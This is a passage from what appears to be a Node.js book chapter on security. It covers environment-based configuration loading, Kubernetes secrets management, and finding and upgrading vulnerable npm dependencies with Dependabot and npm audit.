<p>Packages like <code>config</code> and <code>nconf</code> provide a <a data-primary="config package" data-type="indexterm" id="idm46291173018120"/><a data-primary="packages" data-secondary="config" data-type="indexterm" id="idm46291173017384"/><a data-primary="nconf package" data-type="indexterm" id="idm46291173016440"/><a data-primary="packages" data-secondary="nconf" data-type="indexterm" id="idm46291173015768"/>mechanism for loading and merging configuration from different files based on the current environment. Personally, I feel that using such packages is usually overkill and can instead be replaced with a few lines of code, like what you’re about to implement.</p>&#13;
&#13;
<p>A module for performing application configuration should do a few things. First, it should determine the current environment by inspecting the standard <code>NODE_ENV</code> environment variable. Next, it should load a configuration file specific to the current environment. Finally, as a convenience it should also load a fallback configuration file that contains default values to be applied if missing in the environment-specific file. The fallback file is useful for items that are always configured the same way in each environment, like loading the same <code>REDIS</code> environment variable.</p>&#13;
&#13;
<p>Run the following commands to create a new directory named <em>configuration</em>, initialize a new npm project inside of it, and then create some configuration files for a few &#13;
<span class="keep-together">environments:</span></p>&#13;
&#13;
<pre data-code-language="bash" data-type="programlisting"><code class="nv">$ </code>mkdir configuration <code class="o">&amp;&amp;</code> <code class="nb">cd </code>configuration&#13;
<code class="nv">$ </code>npm init -y&#13;
<code class="nv">$ </code>mkdir config&#13;
<code class="nv">$ </code>touch config/<code class="o">{</code>index,default,development,staging,production<code class="o">}</code>.js</pre>&#13;
&#13;
<p>The <em>config/index.js</em> file is required by application code to access configuration values. It exports a single object representing configuration key/value pairs. The <em>config/default.js</em> file contains the fallback configuration values. The remaining three files are environment-specific.</p>&#13;
&#13;
<p>Next, modify the <em>config/default.js</em> file and add the content from <a data-type="xref" href="#ex_config_default">Example 10-4</a> to it.</p>&#13;
<div data-type="example" id="ex_config_default">&#13;
<h5><span class="label">Example 10-4. </span><em>configuration/config/default.js</em></h5>&#13;
&#13;
<pre data-code-language="javascript" data-type="programlisting"><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>&#13;
  <code class="nx">REDIS</code><code class="o">:</code> <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">REDIS</code><code class="p">,</code>&#13;
  <code class="nx">WIDGETS_PER_BATCH</code><code class="o">:</code> <code class="mi">2</code><code class="p">,</code>&#13;
  <code class="nx">MAX_WIDGET_PAYLOAD</code><code class="o">:</code> <code class="nb">Number</code><code class="p">(</code><code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">PAYLOAD</code><code class="p">)</code> <code class="o">||</code> <code class="mi">1024</code> <code class="o">*</code> <code class="mi">1024</code>&#13;
<code class="p">};</code></pre></div>&#13;
&#13;
<p>In this default configuration file, the <code>REDIS</code> connection string defaults to loading the value provided by the <code>REDIS</code> environment variable. The <code>WIDGETS_PER_BATCH</code> configuration, presumably related to business logic, defaults to a conservative value of 2. Finally, the <code>MAX_WIDGET_PAYLOAD</code> value is a number representing either the <code>PAYLOAD</code> environment variable or a value representing 1 megabyte.</p>&#13;
&#13;
<p>These values are provided to any caller by exporting a single top-level object. This means that configuration files could also be exposed using JSON or YAML, <a data-primary="YAML" data-secondary="configuration files and" data-type="indexterm" id="idm46291172915480"/>though the former makes it difficult to add comments, and both of them require some sort of explicit syntax for reading and coercing environment variables.</p>&#13;
&#13;
<p>Next, modify the <em>config/development.js</em> file, adding the content from <a data-type="xref" href="#ex_config_development">Example 10-5</a>.</p>&#13;
<div data-type="example" id="ex_config_development">&#13;
<h5><span class="label">Example 10-5. </span><em>configuration/config/development.js</em></h5>&#13;
&#13;
<pre data-code-language="javascript" data-type="programlisting"><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>&#13;
  <code class="nx">ENV</code><code class="o">:</code> <code class="s1">'development'</code><code class="p">,</code>&#13;
  <code class="nx">REDIS</code><code class="o">:</code> <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">REDIS</code> <code class="o">||</code> <code class="s1">'redis://localhost:6379'</code><code class="p">,</code>&#13;
  <code class="nx">MAX_WIDGET_PAYLOAD</code><code class="o">:</code> <code class="kc">Infinity</code>&#13;
<code class="p">};</code></pre></div>&#13;
&#13;
<p>The development configuration file defines three entries. The first is <code>ENV</code> and is a convenience that allows an application to get the current environment by reading &#13;
<span class="keep-together"><code>CONFIG.ENV</code></span> instead of <code>process.env.NODE_ENV</code>. Next up is the <code>REDIS</code> value, which overwrites the same value from the default configuration file. In this case, the value defaults to connecting to a Redis instance on the local machine. However, if the user does choose to provide a <code>REDIS</code> environment value, it will still be honored. The final configuration value, <code>MAX_WIDGET_PAYLOAD</code>, also overrides the default value, setting it to <code>Infinity</code>.</p>&#13;
<div data-type="tip"><h6>Tip</h6>&#13;
<p>While it’s possible to access <code>process.env</code> throughout an application’s codebase, doing so makes it difficult for an engineer to find and understand every environment variable that an application uses. Centralizing all environment variable reads to a single <em>config/</em> directory can make them self-documenting.</p>&#13;
</div>&#13;
&#13;
<p>For this example, the contents of <em>config/production.js</em> and <em>config/staging.js</em> aren’t too important. Each of them should export the appropriately named <code>ENV</code> configuration value, and maybe override another setting like <code>WIDGETS_PER_BATCH</code>. One thing worth considering is that, with a production application, the staging and production environments should be very similar. By keeping them similar, you’re able to find issues in staging before they reach production. For example, one might choose to use a single queue in staging and two queues in production in order to reduce costs. However, with such a configuration, a bug in the code where messages are always removed from queue #1 would not be encountered in staging and would fail in production.</p>&#13;
&#13;
<p>Next, modify the <em>config/index.js</em> file to look like <a data-type="xref" href="#ex_config_index">Example 10-6</a>.</p>&#13;
<div data-type="example" id="ex_config_index">&#13;
<h5><span class="label">Example 10-6. </span><em>configuration/config/index.js</em></h5>&#13;
&#13;
<pre data-code-language="javascript" data-type="programlisting"><code class="kr">const</code><code> </code><code class="p">{</code><code> </code><code class="nx">join</code><code> </code><code class="p">}</code><code> </code><code class="o">=</code><code> </code><code class="nx">require</code><code class="p">(</code><code class="s1">'path'</code><code class="p">)</code><code class="p">;</code><code>&#13;
</code><code class="kr">const</code><code> </code><code class="nx">ENV</code><code> </code><code class="o">=</code><code> </code><code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_ENV</code><code class="p">;</code><code>&#13;
&#13;
</code><code class="k">try</code><code> </code><code class="p">{</code><code>&#13;
  </code><code class="kd">var</code><code> </code><code class="nx">env_config</code><code> </code><code class="o">=</code><code> </code><code class="nx">require</code><code class="p">(</code><code class="nx">join</code><code class="p">(</code><code class="nx">__dirname</code><code class="p">,</code><code> </code><code class="sb">`</code><code class="si">${</code><code class="nx">ENV</code><code class="si">}</code><code class="sb">.js</code><code class="sb">`</code><code class="p">)</code><code class="p">)</code><code class="p">;</code><code>&#13;
</code><code class="p">}</code><code> </code><code class="k">catch</code><code> </code><code class="p">(</code><code class="nx">e</code><code class="p">)</code><code> </code><code class="p">{</code><code>&#13;
  </code><code class="nx">console</code><code class="p">.</code><code class="nx">error</code><code class="p">(</code><code class="sb">`</code><code class="sb">Invalid environment: "</code><code class="si">${</code><code class="nx">ENV</code><code class="si">}</code><code class="sb">"!</code><code class="sb">`</code><code class="p">)</code><code class="p">;</code><code>&#13;
  </code><code class="nx">console</code><code class="p">.</code><code class="nx">error</code><code class="p">(</code><code class="sb">`</code><code class="sb">Usage: NODE_ENV=&lt;ENV&gt; node app.js</code><code class="sb">`</code><code class="p">)</code><code class="p">;</code><code>&#13;
  </code><code class="nx">process</code><code class="p">.</code><code class="nx">exit</code><code class="p">(</code><code class="mi">1</code><code class="p">)</code><code class="p">;</code><code>&#13;
</code><code class="p">}</code><code>&#13;
</code><code class="kr">const</code><code> </code><code class="nx">def_config</code><code> </code><code class="o">=</code><code> </code><code class="nx">require</code><code class="p">(</code><code class="nx">join</code><code class="p">(</code><code class="nx">__dirname</code><code class="p">,</code><code> </code><code class="s1">'default.js'</code><code class="p">)</code><code class="p">)</code><code class="p">;</code><code>&#13;
&#13;
</code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code><code> </code><code class="o">=</code><code> </code><code class="nb">Object</code><code class="p">.</code><code class="nx">assign</code><code class="p">(</code><code class="p">{</code><code class="p">}</code><code class="p">,</code><code> </code><code class="nx">def_config</code><code class="p">,</code><code> </code><code class="nx">env_config</code><code class="p">)</code><code class="p">;</code><code> </code><a class="co" href="#callout_security_CO1-1" id="co_security_CO1-1"><img alt="1" src="assets/1.png"/></a></pre>&#13;
<dl class="calloutlist">&#13;
<dt><a class="co" href="#co_security_CO1-1" id="callout_security_CO1-1"><img alt="1" src="assets/1.png"/></a></dt>&#13;
<dd><p>Shallow merge of configuration files</p></dd>&#13;
</dl></div>&#13;
&#13;
<p>This file merges the top-level <a data-primary="configuration files" data-secondary="merging" data-type="indexterm" id="idm46291172653576"/>properties from the <em>config/default.js</em> configuration file with the appropriate configuration file for the current environment and then exports the merged values. If the configuration file can’t be found, then the module prints an error and the application exits with a nonzero status code. Since an application presumably can’t run without any configuration, and assuming the configuration is read early in the startup process, it’s then appropriate to display an error and terminate the process. It’s better to fail immediately than to fail once an application handles its first HTTP request.</p>&#13;
&#13;
<p>The configuration settings can then be accessed by requiring the config file from &#13;
<span class="keep-together">a Node.js module.</span> For example, the code to connect to a Redis instance might look &#13;
<span class="keep-together">like this:</span></p>&#13;
&#13;
<pre data-code-language="javascript" data-type="programlisting"><code class="kr">const</code> <code class="nx">Redis</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'ioredis'</code><code class="p">);</code>&#13;
<code class="kr">const</code> <code class="nx">CONFIG</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'./config/index.js'</code><code class="p">);</code>&#13;
<code class="kr">const</code> <code class="nx">redis</code> <code class="o">=</code> <code class="k">new</code> <code class="nx">Redis</code><code class="p">(</code><code class="nx">CONFIG</code><code class="p">.</code><code class="nx">REDIS</code><code class="p">);</code></pre>&#13;
&#13;
<p>By using this approach, sensitive configuration settings are kept off disk and out of version control, developers are free to run their application locally using sensible defaults, environment variable access is done in a central location, and per-environment configuration can be maintained. By using a simple configuration loader  like <em>config/index.js</em>, the application doesn’t depend on another <a data-primary="security" data-secondary="configuration files" data-startref="sec_config" data-type="indexterm" id="idm46291172690824"/><a data-primary="configuration files" data-secondary="security and" data-startref="sec_config1" data-type="indexterm" id="idm46291172689704"/>npm package.</p>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Secrets Management" data-type="sect2"><div class="sect2" id="idm46291173037480">&#13;
<h2>Secrets Management</h2>&#13;
&#13;
<p><em>Secrets management</em> is a technique <a data-primary="secrets management" data-type="indexterm" id="secretmange"/><a data-primary="security" data-secondary="secrets management" data-type="indexterm" id="secretmange1"/>for storing and retrieving sensitive values. This typically includes credentials like usernames, passwords, and API keys. Tools that implement secrets management keep the values hidden by default, usually requiring a mechanism to decrypt and view them. This behavior is a little different than how environment variables are treated, where interfaces often keep them visible.</p>&#13;
&#13;
<p>Secrets management software provides a mechanism for an application to retrieve the secrets at runtime. These secrets can be provided in a few ways, such as having the application request them from a service. Often the most convenient method is by injecting them as environment variables, an approach that doesn’t require application changes.</p>&#13;
&#13;
<p>Kubernetes supports secrets management and can provide it by either mounting a file in the container that contains the secret value, or by environment variable. Defining secrets using Kubernetes is similar to defining other resources. One way to do it is by creating a YAML file with the secret. The following is an example of how the Redis connection string might be made into a secret:</p>&#13;
&#13;
<pre data-code-language="yaml" data-type="programlisting"><code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>&#13;
<code class="nt">kind</code><code class="p">:</code> <code class="l-Scalar-Plain">Secret</code>&#13;
<code class="nt">metadata</code><code class="p">:</code>&#13;
  <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">redisprod</code>&#13;
<code class="nt">type</code><code class="p">:</code> <code class="l-Scalar-Plain">Opaque</code>&#13;
<code class="nt">stringData</code><code class="p">:</code>&#13;
  <code class="nt">redisconn</code><code class="p">:</code> <code class="s">"redis://admin:hunter2@192.168.2.1"</code></pre>&#13;
&#13;
<p>A YAML file can be <a data-primary="YAML" data-secondary="secrets management" data-type="indexterm" id="idm46291172731480"/>used to define several secrets. In this case, there’s only one secret defined as <em>redisprod:redisconn</em>. With other secrets it might make sense to keep them separated, like when dealing with separate username and password values. Applying this file adds the secret to the Kubernetes cluster. The file can then be destroyed, and with it, any plain-text versions of the secret.</p>&#13;
&#13;
<p>Later, when defining a pod in another YAML file, the secret can be referenced when defining the environment variables in the <code>spec.template.spec.containers</code> section. The following is an example of what one of these env vars might look like:</p>&#13;
&#13;
<pre data-code-language="yaml" data-type="programlisting"><code class="nt">env</code><code class="p">:</code>&#13;
<code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">REDIS</code>&#13;
  <code class="nt">valueFrom</code><code class="p">:</code>&#13;
    <code class="nt">secretKeyRef</code><code class="p">:</code>&#13;
      <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">redisprod</code>&#13;
      <code class="nt">key</code><code class="p">:</code> <code class="l-Scalar-Plain">redisconn</code></pre>&#13;
&#13;
<p>In this case, the <code>REDIS</code> environment variable pulls its value from the <em>redisprod:redisconn</em> secret. When Kubernetes launches the container, it first retrieves the secret, then decrypts the value, and finally provides it to the application.</p>&#13;
<aside data-type="sidebar" epub:type="sidebar"><div class="sidebar" id="idm46291172765416">&#13;
<h5>Alternatives to Kubernetes Secrets</h5>&#13;
<p>If your organization uses AWS, it might make sense to store secrets like this using AWS Vault, while Secret Manager might be the most convenient choice if hosting on Google Cloud. A more generic secrets management tool is HashiCorp Vault, which can be <a data-primary="secrets management" data-startref="secretmange" data-type="indexterm" id="idm46291172763912"/><a data-primary="security" data-secondary="secrets management" data-startref="secretmange1" data-type="indexterm" id="idm46291172768456"/>integrated into other tools, Kubernetes included.</p>&#13;
</div></aside>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Upgrading Dependencies" data-type="sect1"><div class="sect1" id="ch_security_sec_deps">&#13;
<h1>Upgrading Dependencies</h1>&#13;
&#13;
<p>Any Node.js project with a <a data-primary="security" data-secondary="dependencies upgrade" data-type="indexterm" id="depup"/><a data-primary="dependencies" data-secondary="upgrades, security and" data-type="indexterm" id="depup1"/><a data-primary="security" data-secondary="vulnerabilities" data-type="indexterm" id="secvul"/><a data-primary="vulnerabilities" data-secondary="security and" data-type="indexterm" id="secvul1"/>sufficient number of dependencies will eventually contain known vulnerabilities. This is especially true if the project doesn’t frequently update its dependencies. The thought that a project can “change” while the code is at rest almost sounds counterintuitive, but the important keyword is that these are “known” vulnerabilities. The vulnerabilities were present when the dependency was first added to the project—it’s just that you, and presumably the package’s maintainer, learned about the vulnerabilities later.</p>&#13;
&#13;
<p>One way to help avoid vulnerabilities in packages is to keep them constantly updated. Theoretically, package authors continually learn better practices, and vulnerabilities are always being reported, so keeping packages up to date should help. That said, at one point, an application is functioning properly, and by updating packages there is the risk that a subtle breaking change is introduced. Ideally, package authors follow SemVer (covered in <a data-type="xref" href="ch06.html#ch_deployments_sec_guts">“Modules, Packages, and SemVer”</a>), but that doesn’t always happen. Certainly, other vulnerabilities could be introduced in new releases. The old adage is “If it ain’t broke, don’t fix it.”</p>&#13;
&#13;
<p>Any change made to an application’s dependencies will require a new round of testing, so continuously keeping dependency versions on the bleeding edge would require a lot of work. A complex app might have newer versions of dependencies released every few hours! Not updating dependencies at all will result in an application that’s full of vulnerabilities and a nightmare to update. Some sort of middle ground must be reached.</p>&#13;
&#13;
<p>One approach is to only update packages if they introduce a new feature, performance boost, or vulnerability fix that will specifically benefit the application. Other packages that are vital, such as the main web server or framework used by an application, are also worthy of common updates to make future refactors easier.</p>&#13;
&#13;
<p>When you do decide to update packages, consider making changes piecemeal. If a project has 20 dependencies that should be upgraded, then break them up over several pull requests. For larger widespread changes, like changing the web server, only change that one dependency in a PR if you can (while also making any required application changes). For dependencies that are tightly coupled, like a database library and an SQL query builder, it might make sense to combine them in a PR. For other changes that don’t have as big of an application impact, such as dev dependencies, upgrading several of them in a single pull request might be fine (assuming there aren’t too many code changes involved).</p>&#13;
<div data-type="warning" epub:type="warning"><h6>Warning</h6>&#13;
<p>Reviewers won’t be able to find bugs if a pull request contains too many changes. It’s almost impossible to associate code changes with dependency changes if unrelated upgrades are combined.</p>&#13;
</div>&#13;
&#13;
<p>npm manages a database<sup><a data-type="noteref" href="ch10.html#idm46291172781992" id="idm46291172781992-marker">3</a></sup> of known vulnerabilities and has a web page for reporting vulnerable packages. Snyk also maintains their <a class="orm:hideurl" href="https://snyk.io/vuln?type=npm">Vulnerability DB for npm packages</a> service. In this section, you’ll work with tools that automatically compare an application’s dependencies to npm’s vulnerability database.</p>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Automatic Upgrades with GitHub Dependabot" data-type="sect2"><div class="sect2" id="idm46291172792440">&#13;
<h2>Automatic Upgrades with GitHub Dependabot</h2>&#13;
&#13;
<p>GitHub has multiple automated <a data-primary="GitHub" data-secondary="Dependabot" data-type="indexterm" id="gitdepend"/><a data-primary="Dependabot" data-type="indexterm" id="depend"/>security services that can be enabled on a given repository. They offer support for several platforms, including Node.js projects that consume npm packages. To enable these services, visit the Settings tab on a repository you are an administrator of, click the Security &amp; analysis tab, and then enable the different security features offered. GitHub has three services as of this writing: <em>Dependency graph</em>, <em>Dependabot alerts</em>, and <em>Dependabot security updates</em>. Each service depends on the service before it. A repository will benefit from automated pull requests that upgrade dependencies as a result of enabling these services.</p>&#13;
&#13;
<p>Dependabot is a GitHub service that creates pull requests that update known vulnerabilities in your dependencies. <a data-type="xref" href="#fig_github_security">Figure 10-1</a> is a screenshot of a banner that appears at the top of a repository when known vulnerabilities have been discovered.</p>&#13;
&#13;
<figure><div class="figure" id="fig_github_security">&#13;
<img alt="GitHub displaying an alert that a project contains known vulnerabilities" src="assets/dsnj_1001.png"/>&#13;
<h6><span class="label">Figure 10-1. </span>The dreaded GitHub dependency vulnerability</h6>&#13;
</div></figure>&#13;
&#13;
<p>Dependabot currently doesn’t support changing application code. This means it’s impossible for Dependabot to create a pull request for every vulnerability. For &#13;
<span class="keep-together">example</span>, if package <code>foobar@1.2.3</code> contains a vulnerability and the only fix is in &#13;
<span class="keep-together"><code>foobar@2.0.0</code></span>, then Dependabot won’t create a pull request since the SemVer change suggests that a breaking API change was made. That said, the GitHub UI still displays a banner and provides contextual information about vulnerable packages.</p>&#13;
&#13;
<p>Any continuous integration tests enabled on the repository will still run against Dependabot pull requests. This should help provide confidence that a particular upgrade is safe. That said, when it comes to pull requests for packages that are extremely integral to your application, you might be better off making the change locally.</p>&#13;
&#13;
<p>With Dependabot security updates enabled on your repository, you’ll occasionally receive pull requests. <a data-type="xref" href="#fig_github_dependabot_pr">Figure 10-2</a> is a screenshot of what one of these pull requests looks like.</p>&#13;
&#13;
<figure><div class="figure" id="fig_github_dependabot_pr">&#13;
<img alt="Dependabot creating a pull request" src="assets/dsnj_1002.png"/>&#13;
<h6><span class="label">Figure 10-2. </span>Automatic Dependabot pull request</h6>&#13;
</div></figure>&#13;
&#13;
<p>A Dependabot pull request provides a list of commands that you can trigger by replying to it. Dependabot won’t continuously rebase a pull request on the master branch as commits are merged. Instead, you can reply with the <strong><code>@dependabot rebase</code></strong> command to trigger a rebase. The pull request also includes contextual information about the vulnerability being fixed, such as content from a changelog and even git commits between the currently installed version of the package and the version being &#13;
<span class="keep-together">upgraded to.</span></p>&#13;
&#13;
<p>The Dependabot pull request makes it very convenient to merge a package upgrade and also provides a lot of useful information about the vulnerability. Sadly, it only works for a subset of situations where a package upgrade is required. For the other situations. you need a more manual approach.</p>&#13;
<aside data-type="sidebar" epub:type="sidebar"><div class="sidebar" id="idm46291172808536">&#13;
<h5>Alternatives to GitHub Dependabot</h5>&#13;
<p><a class="orm:hideurl" href="https://snyk.io">Snyk</a> offers a paid product that also creates pull requests and can even scan a repository for <a data-primary="GitHub" data-secondary="Dependabot" data-startref="gitdepend" data-type="indexterm" id="idm46291172799352"/><a data-primary="Dependabot" data-startref="depend" data-type="indexterm" id="idm46291172798104"/>certain types of vulnerabilities.</p>&#13;
</div></aside>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Manual Upgrades with npm CLI" data-type="sect2"><div class="sect2" id="idm46291172787656">&#13;
<h2>Manual Upgrades with npm CLI</h2>&#13;
&#13;
<p>Dependabot simplifies package <a data-primary="npm CLI" data-secondary="manual upgrades" data-type="indexterm" id="npmman"/>upgrades in some situations, but more often than not, you’ll need to take the manual approach. The npm CLI provides a few subcommands to help make this process easier.</p>&#13;
&#13;
<p>Run the following commands to create a new directory named <em>audit</em>, create a new npm project, and install some packages with known vulnerabilities:</p>&#13;
&#13;
<pre data-code-language="bash" data-type="programlisting"><code class="nv">$ </code>mkdir audit <code class="o">&amp;&amp;</code> <code class="nb">cd </code>audit&#13;
<code class="nv">$ </code>npm init -y&#13;
<code class="nv">$ </code>npm install js-yaml@3.9.1 hoek@4.2.0</pre>&#13;
&#13;
<p>Once the <code>npm install</code> command finishes, it should display some messages. When I run the command, I get the following messages, though by the time you run these commands, you might see even more:</p>&#13;
&#13;
<pre data-type="programlisting">added 5 packages from 8 contributors and audited 5 packages in 0.206s&#13;
found 3 vulnerabilities (2 moderate, 1 high)&#13;
  run `npm audit fix` to fix them, or `npm audit` for details</pre>&#13;
&#13;
<p>The first command you should know prints a list of outdated packages. This helps find packages that are candidates for an upgrade, though not necessarily which packages are vulnerable. Run the following command to get a list of outdated packages:</p>&#13;
&#13;
<pre data-type="programlisting">$ npm outdated</pre>&#13;
&#13;
<p><a data-type="xref" href="#table_npm_outdated_output">Table 10-2</a> contains the results that I get back from this command.</p>&#13;
<table id="table_npm_outdated_output">&#13;
<caption><span class="label">Table 10-2. </span>Example <code>npm outdated</code> output</caption>&#13;
<thead>&#13;
<tr>&#13;
<th>Package</th>&#13;
<th>Current</th>&#13;
<th>Wanted</th>&#13;
<th>Latest</th>&#13;
<th>Location</th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td><p>hoek</p></td>&#13;
<td><p>4.2.0</p></td>&#13;
<td><p>4.2.1</p></td>&#13;
<td><p>6.1.3</p></td>&#13;
<td><p>audit</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td><p>js-yaml</p></td>&#13;
<td><p>3.9.1</p></td>&#13;
<td><p>3.14.0</p></td>&#13;
<td><p>3.14.0</p></td>&#13;
<td><p>audit</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
&#13;
<p>Note that the versions and packages you see may be different since new packages are released all the time. The <em>current</em> column states the version of the package that is currently installed. The <em>wanted</em> column states the greatest version of the package that is satisfied by the <em>package.json</em> SemVer range, which will differ over time as newer packages are published. The <em>latest</em> column lists the most recent version of the package available on npm. The final <em>location</em> column lets you know where the package is &#13;
<span class="keep-together">located.</span></p>&#13;
&#13;
<p>The <code>npm audit</code> <a data-primary="npm audit subcommand" data-type="indexterm" id="idm46291172466904"/>subcommand,<sup><a data-type="noteref" href="ch10.html#idm46291172466040" id="idm46291172466040-marker">4</a></sup> on the other hand, provides a list of packages installed in the current project that have known security vulnerabilities.</p>&#13;
&#13;
<p>The npm CLI, by default, provides vulnerability warnings about packages being installed. This happens not only when a vulnerable package is installed directly, like you’ve just done, but also when any packages are installed. Run the following two commands to discard the current <em>node_modules</em> directory and to reinstall everything from scratch:</p>&#13;
&#13;
<pre data-code-language="bash" data-type="programlisting"><code class="nv">$ </code>rm -rf node_modules&#13;
<code class="nv">$ </code>npm install</pre>&#13;
&#13;
<p>You should see the same vulnerability warnings printed again. But these vulnerability messages only warn in aggregate and don’t list individual offending packages. To get more detailed information, you need to run another command:</p>&#13;
&#13;
<pre data-code-language="bash" data-type="programlisting"><code class="nv">$ </code>npm audit</pre>&#13;
&#13;
<p>This command displays even more details about the vulnerabilities. It goes through the entire list of vulnerable packages and displays their known vulnerabilities. <a data-type="xref" href="#table_npm_audit_output">Table 10-3</a> contains the information I see when running the command.</p>&#13;
<table id="table_npm_audit_output">&#13;
<caption><span class="label">Table 10-3. </span>Example <code>npm audit</code> output</caption>&#13;
<thead>&#13;
<tr>&#13;
<th>Level</th>&#13;
<th>Type</th>&#13;
<th>Package</th>&#13;
<th>Dependency of</th>&#13;
<th>Path</th>&#13;
<th>More info</th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td><p>Moderate</p></td>&#13;
<td><p>Denial of Service</p></td>&#13;
<td><p>js-yaml</p></td>&#13;
<td><p>js-yaml</p></td>&#13;
<td><p>js-yaml</p></td>&#13;
<td><p><a href="https://npmjs.com/advisories/788"><em class="hyperlink">https://npmjs.com/advisories/788</em></a></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td><p>High</p></td>&#13;
<td><p>Code Injection</p></td>&#13;
<td><p>js-yaml</p></td>&#13;
<td><p>js-yaml</p></td>&#13;
<td><p>js-yaml</p></td>&#13;
<td><p><a href="https://npmjs.com/advisories/813"><em class="hyperlink">https://npmjs.com/advisories/813</em></a></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td><p>Moderate</p></td>&#13;
<td><p>Prototype Pollution</p></td>&#13;
<td><p>hoek</p></td>&#13;
<td><p>hoek</p></td>&#13;
<td><p>hoek</p></td>&#13;
<td><p><a href="https://npmjs.com/advisories/566"><em class="hyperlink">https://npmjs.com/advisories/566</em></a></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
&#13;
<p>In my case, there are three known vulnerabilities: two in the <code>js-yaml</code> package and one in the <code>hoek</code> package. npm has four levels of vulnerability severity: low, moderate, high, and critical. These are an estimate of how much the vulnerability might affect your application. The <em>type</em> column provides a short classification for the vulnerability; the first is a <em>Denial of Service</em> attack that may crash an application and has earned a moderate severity. The <em>Code Injection</em> attack is much more dangerous and can lead to situations like stolen passwords and, therefore, is labeled as high. The third, <em>Prototype Pollution</em>, is also considered moderate.</p>&#13;
&#13;
<p>The <em>package</em> column states the package that the vulnerability is in, the <em>dependency of</em> column states the parent package, and the <em>path</em> column provides the full logical path to the offending package. The <em>patched in</em> column, if present, gives a version range that is known to fix the package. In the case of these results, the npm audit has determined that the first two <code>js-yaml</code>-related vulnerabilities can be fixed automatically, while the third <code>hoek</code> package must be fixed manually.</p>&#13;
&#13;
<p>The npm output also displays a command that you can run to update the package, if appropriate. Run the following command, which is what the npm audit has recommended to fix the first two vulnerabilities:</p>&#13;
&#13;
<pre data-code-language="bash" data-type="programlisting"><code class="nv">$ </code>npm update js-yaml --depth 1</pre>&#13;
&#13;
<p>Doing so upgrades the package to a known-good version that should still be compatible with the SemVer range specified in the <em>package.json</em> file. In my case, the dependency for <code>js-yaml@^3.9.1</code> was changed in both <em>package.json</em> and <em>package-lock.json</em> to use <code>js-yaml@^3.14.0</code>.</p>&#13;
&#13;
<p>At this point, if you were to run the <strong><code>npm audit</code></strong> command a second time, you would only see the <code>hoek</code> package listed. Unfortunately, <code>npm audit</code> won’t provide a recommendation to fix this package. But based on the version range listed in the <em>patched in</em> column, it’s known that the package is fixed in version <code>4.2.1</code>. Run the following command to manually fix the vulnerable package:</p>&#13;
&#13;
<pre data-code-language="bash" data-type="programlisting"><code class="nv">$ </code>npm update hoek</pre>&#13;
&#13;
<p>In my case, the package went from being <code>hoek@^4.2.0</code> to <code>hoek@^4.2.1</code>.</p>&#13;
&#13;
<p>The <code>npm audit</code> command <a data-primary="npm audit subcommand" data-type="indexterm" id="idm46291172350888"/><a data-primary="commands" data-secondary="npm audit" data-type="indexterm" id="idm46291172350152"/>can be adapted slightly to only list vulnerabilities that exceed a certain severity level. Also note that the <code>npm audit</code> command returns a non-zero status code if a vulnerable package has been encountered. This could be used as part of a nightly cron job to keep an eye on the health of an application. However, it shouldn’t be used as part of a continuous integration test, as packages that have become vulnerable and that are installed on the master branch shouldn’t cause pull requests to fail that don’t introduce the faulty package.</p>&#13;
&#13;
<p>Here’s a version of the command that can be used to fail a check when non-dev dependencies have a vulnerability that is considered high or greater:</p>&#13;
&#13;
<pre data-code-language="bash" data-type="programlisting"><code class="nv">$ </code>npm audit --audit-level<code class="o">=</code>high --only<code class="o">=</code>prod <code class="p">;</code> <code class="nb">echo</code> <code class="nv">$?</code></pre>&#13;
&#13;
<p>Unfortunately, you will sometimes encounter packages that do have a vulnerability but do not have a patched <a data-primary="security" data-secondary="vulnerabilities" data-startref="secvul" data-type="indexterm" id="idm46291172313880"/><a data-primary="vulnerabilities" data-secondary="security and" data-startref="secvul1" data-type="indexterm" id="idm46291172312792"/><a data-primary="npm CLI" data-secondary="manual upgrades" data-startref="npmman" data-type="indexterm" id="idm46291172311576"/>version published.</p>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Unpatched Vulnerabilities" data-type="sect2"><div class="sect2" id="idm46291172811480">&#13;
<h2>Unpatched Vulnerabilities</h2>&#13;
&#13;
